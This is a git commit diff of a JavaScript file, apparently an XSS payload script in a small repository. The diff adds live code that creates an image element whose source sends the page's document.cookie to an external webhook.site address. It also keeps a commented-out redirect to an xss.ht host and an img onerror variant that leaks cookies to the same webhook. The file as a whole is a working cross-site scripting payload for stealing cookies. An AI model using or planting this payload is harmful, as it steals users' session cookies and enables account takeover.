70f3c36cd6829a13d704b67412a3cb5632f85869
HotPlugin <57496383+hotplugin0x01@users.noreply.github.com>
2022-10-27 00:27:05 +0500

    Update x.js

--- x.js
+++ x.js
@@ -1,12 +1,17 @@
-function xssPayload() {
-  document.location="https://hailxss.xss.ht";
+// alert(document.cookie);
+var i=new Image;
+i.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?"+document.cookie;
+
+
+// function xssPayload() {
+//   document.location="https://hailxss.xss.ht";
 //   const alertMsg = 'xss ' + document.location;
 //   console.log(alertMsg);
 //   window.prompt(alertMsg);
-}
+// }
 
 // console.log('XSS payload executed');
-xssPayload();
+// xssPayload();
 
 
 // <img src=x onerror=this.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+document.cookie>
